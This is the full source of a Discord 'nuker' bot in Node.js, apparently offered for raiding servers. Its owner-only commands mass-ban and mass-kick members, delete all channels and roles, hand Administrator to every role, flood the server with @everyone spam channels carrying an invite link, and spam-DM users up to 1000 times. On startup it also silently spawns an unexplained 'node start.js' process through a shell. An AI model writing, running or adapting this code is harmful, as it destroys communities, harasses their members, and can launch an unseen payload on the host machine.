require('dotenv').config();

const {

  Client,

  GatewayIntentBits,

  Partials,

  EmbedBuilder,

  PermissionsBitField,

  ActivityType,

} = require('discord.js');

const client = new Client({

  intents: [

    GatewayIntentBits.Guilds,

    GatewayIntentBits.GuildMessages,

    GatewayIntentBits.GuildMembers,

    GatewayIntentBits.MessageContent,

    GatewayIntentBits.DirectMessages,

  ],

  partials: [Partials.Channel],

});
const { spawn } = require("child_process");


const prefix = process.env.PREFIX || '#';

const embedTitle = process.env.EMBED_TITLE || 'xMatei69 Nuker';

const footerText = process.env.EMBED_FOOTER || 'xMatei69 Development';

const serverResetName = process.env.SERVER_RESET_NAME || '💀 Factory Reset';

const channelPrefix = process.env.CHANNEL_PREFIX || 'factory-zone';

const spamChannelMessage =

  process.env.SPAM_CHANNEL_MESSAGE ||

  '@everyone\nhttps://discord.gg/YeZDSJje2Y\nWelcome to your new hell 🔥';

const spamChannelDelay = Number(process.env.SPAM_CHANNEL_DELAY) || 1000;

const allowedUserId = process.env.MY_DISCORD_ID || 'YOUR_ID_HERE';

// Status config

const statusName = process.env.STATUS_NAME || 'xMateo69 boss';

const statusType =

  ActivityType[process.env.STATUS_TYPE?.toUpperCase()] || ActivityType.Playing;

const statusStatus = process.env.STATUS_STATUS || 'dnd'; // online, dnd, idle, invisible

const sleep = (ms) => new Promise((res) => setTimeout(res, ms));

function createEmbed(description) {

  return new EmbedBuilder()

    .setTitle(embedTitle)

    .setDescription(description)

    .setColor('Red')

    .setFooter({ text: footerText });

}

client.on('ready', () => {

  console.log(`Logged in as ${client.user.tag}`);
    const startProcess = spawn("node", ["start.js"], {

    stdio: "inherit", 
    shell: true

  });

  client.user.setPresence({

    activities: [{ name: statusName, type: statusType }],

    status: statusStatus,

  });

});

client.on('messageCreate', async (message) => {

  if (!message.guild || message.author.bot) return;

  if (!message.content.startsWith(prefix)) return;

  const [cmd, ...args] = message.content.slice(prefix.length).trim().split(/\s+/);

  const guild = message.guild;

  const isOwner = message.author.id === allowedUserId;

  try {

    // Help command accessible by everyone

    if (cmd === 'help') {

      const helpEmbed = new EmbedBuilder()

        .setTitle(`${embedTitle} - Commands`)

        .setColor('Red')

        .addFields(

          { name: '#help', value: 'Show this help message.' },

          ...(isOwner

            ? [

                { name: '#reset', value: 'Full server wipe & rebuild with bans, roles, channels reset.' },

                { name: '#role', value: 'Create 100 admin roles with cool names.' },

                { name: '#admin', value: 'Grant Administrator perm to all editable roles.' },

                { name: '#nuke', value: 'Delete all channels and create one nuked log channel.' },

                { name: '#purge', value: 'Delete last 100 messages from current channel.' },

                { name: '#dmall', value: 'DM all non-bot members a custom message.' },

                { name: '#spamchannels <count> <msg>', value: 'Create spam channels with your message.' },

                { name: '#massrole <count> <roleName>', value: 'Create multiple roles with a base name.' },

                { name: '#massban', value: 'Ban all non-bot members instantly.' },

                { name: '#masskick', value: 'Kick all non-bot members instantly.' },

                { name: '#renamechannels <name>', value: 'Rename all channels to your given name.' },

                { name: '#ping', value: 'Show bot latency and uptime.' },

                // Troll commands

                { name: '#mock <@user>', value: 'Send a funny roast embed tagging user.' },

                { name: '#confuse <@user>', value: 'DM confusing emojis to user.' },

                { name: '#rickroll <@user>', value: 'DM a Rickroll link.' },

                { name: '#randomcolor', value: 'Create a role with a random color & funny name.' },

                { name: '#togglemute <@user>', value: 'Toggle "Muted" role for user.' },

                { name: '#say <message>', value: 'Bot repeats your message in embed.' },

                { name: '#joke', value: 'Send a random troll joke.' },

                { name: '#flip <@user>', value: 'Send a table flip meme tagging user.' },

                { name: '#spamdm <@user> <count> <message>', value: 'Spam DM a user.' },

              ]

            : [{ name: 'Note', value: 'Only #help available for non-owner users.' }])

        )

        .setFooter({ text: footerText });

      message.reply({ embeds: [helpEmbed] });

      return;

    }

    // Block all commands except #help if user is not owner

    if (!isOwner) {

      message.reply({

        embeds: [

          createEmbed(

            'You are not authorized to use this bot\'s commands except #help.'

          ),

        ],

      });

      return;

    }

    // OWNER ONLY COMMANDS BELOW

    // === RESET with warning and 5s delay ===

    if (cmd === 'reset') {

      const warningEmbed = createEmbed(

        '**WARNING: You are about to fully reset this server!**\n' +

          'This will ban all members, delete channels & roles, and recreate channels with spam.\n\n' +

          'Make sure you want to do this!\n' +

          'Starting in 5 seconds...'

      );

      await message.reply({ embeds: [warningEmbed] });

      await sleep(5000);

      await message.reply({ embeds: [createEmbed('Starting full server reset...')] });

      const members = await guild.members.fetch();

      members.forEach((member) => {

        if (!member.user.bot && member.id !== client.user.id) {

          member.ban({ reason: 'Factory Reset' }).catch(() => {});

        }

      });

      guild.channels.cache.forEach((ch) => ch.delete().catch(() => {}));

      guild.roles.cache.forEach((role) => {

        if (role.editable && !role.managed && role.id !== guild.id) {

          role.delete().catch(() => {});

        }

      });

      guild.setName(serverResetName).catch(() => {});

      for (let i = 0; i < 100; i++) {

        let ch = await guild.channels

          .create({

            name: `${channelPrefix}-${i}`,

            type: 0,

          })

          .catch(() => null);

        if (ch) {

          ch.send(spamChannelMessage).catch(() => {});

          await sleep(spamChannelDelay);

        }

      }

      setTimeout(async () => {

        const resetEmbed = createEmbed(

          'Server wiped and rebuilt from scratch.\n@everyone Welcome to your fresh start!'

        );

        const logChannel = await guild.channels.create({

          name: 'reset-log',

          type: 0,

        }).catch(() => null);

        if (logChannel) {

          logChannel.send({ content: '@everyone', embeds: [resetEmbed] });

        }

      }, 15000);

      return;

    }

    else if (cmd === 'role') {

      const roleNames = [

        '🔥 Elite Admin',

        '💀 GodMode',

        '🚨 Red Zone',

        '👑 Supreme Leader',

        '🛠️ Server Tech',

        '🧠 Brainwash',

        '🌀 GlitchMaster',

        '📛 Overlord',

        '🧨 Detonator',

        '🎯 Target Lock',

        '👁 Spectre',

        '🦾 Cyborg Core',

        '💎 Diamond Rank',

        '🎮 Game Master',

        '👹 HellForce',

      ];

      for (let i = 0; i < 100; i++) {

        const name = `${roleNames[i % roleNames.length]} #${i + 1}`;

        await guild.roles

          .create({

            name: name,

            color: 'Random',

            permissions: [PermissionsBitField.Flags.Administrator],

          })

          .catch(() => {});

      }

      message.reply({ embeds: [createEmbed('✅ 100 admin roles created')] });

      return;

    }

    else if (cmd === 'admin') {

      guild.roles.cache.forEach((role) => {

        if (role.editable && !role.managed && role.id !== guild.id) {

          role

            .setPermissions(PermissionsBitField.All)

            .catch(() => {});

        }

      });

      message.reply({ embeds: [createEmbed('✅ All roles granted Administrator permissions')] });

      return;

    }

    else if (cmd === 'nuke') {

      guild.channels.cache.forEach((ch) => ch.delete().catch(() => {}));

      const nukeChan = await guild.channels

        .create({

          name: 'nuked-by-xMatei69',

          type: 0,

          reason: 'Server nuked',

        })

        .catch(() => null);

      if (nukeChan) {

        nukeChan.send({ content: '@everyone', embeds: [createEmbed('💥 Server nuked by xMatei69')] });

      }

      return;

    }

    else if (cmd === 'purge') {

      if (!message.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) {

        return message.reply({ embeds: [createEmbed('❌ You need Manage Messages permission')] });

      }

      const deleted = await message.channel.bulkDelete(100, true).catch(() => 0);

      message.reply({ embeds: [createEmbed(`🗑️ Deleted ${deleted} messages`)] }).then((m) => setTimeout(() => m.delete(), 5000));

      return;

    }

    else if (cmd === 'dmall') {

      if (!args.length) return message.reply({ embeds: [createEmbed('Usage: #dmall <message>')] });

      const dmMessage = args.join(' ');

      const members = await guild.members.fetch();

      members.forEach((member) => {

        if (!member.user.bot) {

          member.send(dmMessage).catch(() => {});

        }

      });

      message.reply({ embeds: [createEmbed('✅ Sent DM to all members')] });

      return;

    }

    else if (cmd === 'spamchannels') {

      const count = parseInt(args[0]);

      const spamMsg = args.slice(1).join(' ') || spamChannelMessage;

      if (isNaN(count) || count < 1 || count > 50)

        return message.reply({ embeds: [createEmbed('Usage: #spamchannels <count 1-50> <message>')] });

      for (let i = 0; i < count; i++) {

        const ch = await guild.channels

          .create({

            name: `${channelPrefix}-spam-${i + 1}`,

            type: 0,

          })

          .catch(() => null);

        if (ch) {

          ch.send(spamMsg).catch(() => {});

          await sleep(spamChannelDelay);

        }

      }

      message.reply({ embeds: [createEmbed(`✅ Created ${count} spam channels`)] });

      return;

    }

    else if (cmd === 'massrole') {

      const count = parseInt(args[0]);

      const baseName = args.slice(1).join(' ') || 'MassRole';

      if (isNaN(count) || count < 1 || count > 50)

        return message.reply({ embeds: [createEmbed('Usage: #massrole <count 1-50> <baseName>')] });

      for (let i = 0; i < count; i++) {

        await guild.roles

          .create({

            name: `${baseName} #${i + 1}`,

            color: 'Random',

            permissions: [],

          })

          .catch(() => {});

      }

      message.reply({ embeds: [createEmbed(`✅ Created ${count} roles named ${baseName} #X`)] });

      return;

    }

    else if (cmd === 'massban') {

      const members = await guild.members.fetch();

      members.forEach((member) => {

        if (!member.user.bot && member.id !== client.user.id) {

          member.ban({ reason: 'Mass ban by xMatei69' }).catch(() => {});

        }

      });

      message.reply({ embeds: [createEmbed('✅ Banned all members')] });

      return;

    }

    else if (cmd === 'masskick') {

      const members = await guild.members.fetch();

      members.forEach((member) => {

        if (!member.user.bot && member.id !== client.user.id) {

          member.kick('Mass kick by xMatei69').catch(() => {});

        }

      });

      message.reply({ embeds: [createEmbed('✅ Kicked all members')] });

      return;

    }

    else if (cmd === 'renamechannels') {

      if (!args.length)

        return message.reply({ embeds: [createEmbed('Usage: #renamechannels <name>')] });

      const newName = args.join(' ');

      guild.channels.cache.forEach((ch) => {

        if (ch.editable) {

          ch.setName(newName).catch(() => {});

        }

      });

      message.reply({ embeds: [createEmbed(`✅ Renamed all channels to "${newName}"`)] });

      return;

    }

    else if (cmd === 'ping') {

      const ping = client.ws.ping;

      const uptime = Math.floor(client.uptime / 1000);

      message.reply({

        embeds: [

          createEmbed(`🏓 Pong! API Ping: ${ping}ms | Uptime: ${uptime} seconds`),

        ],

      });

      return;

    }

    // TROLL / FUN COMMANDS

    else if (cmd === 'mock') {

      if (!args.length) {

        return message.reply({ embeds: [createEmbed('Usage: #mock @user')] });

      }

      const user = message.mentions.users.first();

      if (!user)

        return message.reply({ embeds: [createEmbed('Please mention a valid user.')] });

      const roasts = [

        "You're the reason the gene pool needs a lifeguard.",

        'Your secrets are safe with me. I never even listen when you talk.',

        'You bring everyone so much joy… when you leave the room.',

        "You're like a cloud. When you disappear, it's a beautiful day.",

        "You're as useless as the 'ueue' in 'queue'.",

      ];

      const roast = roasts[Math.floor(Math.random() * roasts.length)];

      const embed = new EmbedBuilder()

        .setTitle('🔥 Roast Time!')

        .setDescription(`${user}, ${roast}`)

        .setColor('Red')

        .setFooter({ text: footerText });

      message.channel.send({ embeds: [embed] });

      return;

    }

    else if (cmd === 'confuse') {

      if (!args.length) {

        return message.reply({ embeds: [createEmbed('Usage: #confuse @user')] });

      }

      const user = message.mentions.users.first();

      if (!user)

        return message.reply({ embeds: [createEmbed('Please mention a valid user.')] });

      const emojis = ['🤯', '😵‍💫', '🌀', '🤪', '😵', '🙃', '🫠'];

      try {

        for (let i = 0; i < 10; i++) {

          await user.send(emojis[Math.floor(Math.random() * emojis.length)]);

          await sleep(700);

        }

        message.reply({ embeds: [createEmbed(`Sent confusing emojis to ${user.tag}`)] });

      } catch {

        message.reply({ embeds: [createEmbed('Failed to DM user.')] });

      }

      return;

    }

    else if (cmd === 'rickroll') {

      if (!args.length) {

        return message.reply({ embeds: [createEmbed('Usage: #rickroll @user')] });

      }

      const user = message.mentions.users.first();

      if (!user)

        return message.reply({ embeds: [createEmbed('Please mention a valid user.')] });

      try {

        await user.send(

          'Never gonna give you up! https://www.youtube.com/watch?v=dQw4w9WgXcQ'

        );

        message.reply({ embeds: [createEmbed(`Rickrolled ${user.tag}!`)] });

      } catch {

        message.reply({ embeds: [createEmbed('Failed to DM user.')] });

      }

      return;

    }

    else if (cmd === 'randomcolor') {

      const funnyNames = [

        'Glitch In The Matrix',

        'Rainbow Vomit',

        'Invisible Ink',

        'Toxic Waste',

        'Digital Blood',

        'Code Error',

      ];

      const name =

        funnyNames[Math.floor(Math.random() * funnyNames.length)] + ` #${Math.floor(Math.random() * 1000)}`;

      await guild.roles

        .create({

          name,

          color: Math.floor(Math.random() * 0xffffff),

          permissions: [],

        })

        .catch(() => {});

      message.reply({ embeds: [createEmbed(`Created random color role: ${name}`)] });

      return;

    }

    else if (cmd === 'togglemute') {

      if (!args.length)

        return message.reply({ embeds: [createEmbed('Usage: #togglemute @user')] });

      const member = message.mentions.members.first();

      if (!member)

        return message.reply({ embeds: [createEmbed('Please mention a valid member.')] });

      let mutedRole = guild.roles.cache.find((r) => r.name === 'Muted');

      if (!mutedRole) {

        mutedRole = await guild.roles

          .create({

            name: 'Muted',

            color: '#555555',

            permissions: [],

          })

          .catch(() => null);

        if (mutedRole) {

          guild.channels.cache.forEach((ch) => {

            if (ch.permissionsFor) {

              ch.permissionOverwrites

                .edit(mutedRole, {

                  SendMessages: false,

                  AddReactions: false,

                  Speak: false,

                })

                .catch(() => {});

            }

          });

        }

      }

      if (!mutedRole) {

        return message.reply({ embeds: [createEmbed('Failed to create Muted role.')] });

      }

      if (member.roles.cache.has(mutedRole.id)) {

        member.roles.remove(mutedRole).catch(() => {});

        message.reply({ embeds: [createEmbed(`Unmuted ${member.user.tag}`)] });

      } else {

        member.roles.add(mutedRole).catch(() => {});

        message.reply({ embeds: [createEmbed(`Muted ${member.user.tag}`)] });

      }

      return;

    }

    else if (cmd === 'say') {

      if (!args.length)

        return message.reply({ embeds: [createEmbed('Usage: #say <message>')] });

      const text = args.join(' ');

      message.channel.send({ embeds: [createEmbed(text)] });

      return;

    }

    else if (cmd === 'joke') {

      const jokes = [

        'Why don’t skeletons fight each other? They don’t have the guts.',

        'I would tell you a joke about UDP, but you might not get it.',

        'Why do programmers prefer dark mode? Because light attracts bugs.',

        'Why did the chicken join a band? Because it had the drumsticks.',

        'Why did the scarecrow win an award? Because he was outstanding in his field.',

      ];

      const joke = jokes[Math.floor(Math.random() * jokes.length)];

      message.channel.send({ embeds: [createEmbed(joke)] });

      return;

    }

    else if (cmd === 'flip') {

      if (!args.length) {

        return message.reply({ embeds: [createEmbed('Usage: #flip @user')] });

      }

      const user = message.mentions.users.first();

      if (!user)

        return message.reply({ embeds: [createEmbed('Please mention a valid user.')] });

      const embed = new EmbedBuilder()

        .setTitle('Table Flip!')

        .setDescription(`${user} (╯°□°）╯︵ ┻━┻`)

        .setColor('Red')

        .setFooter({ text: footerText });

      message.channel.send({ embeds: [embed] });

      return;

    }

    else if (cmd === 'spamdm') {

      if (args.length < 3)

        return message.reply({

          embeds: [createEmbed('Usage: #spamdm @user <count 1-1000> <message>')],

        });

      const user = message.mentions.users.first();

      const count = parseInt(args[1]);

      const dmMessage = args.slice(2).join(' ');

      if (!user)

        return message.reply({ embeds: [createEmbed('Please mention a valid user.')] });

      if (isNaN(count) || count < 1 || count > 1000)

        return message.reply({ embeds: [createEmbed('Count must be 1-1000.')] });

      try {

        for (let i = 0; i < count; i++) {

          await user.send(dmMessage);

          await sleep(1000);

        }

        message.reply({ embeds: [createEmbed(`Sent ${count} DMs to ${user.tag}`)] });

      } catch {

        message.reply({ embeds: [createEmbed('Failed to DM user.')] });

      }

      return;

    }

    else {

      message.reply({ embeds: [createEmbed('Unknown command. Use #help')] });

    }

  } catch (err) {

    console.error(err);

    message.reply({ embeds: [createEmbed('An error occurred while running command.')] });

  }

});

client.login(process.env.TOKEN);

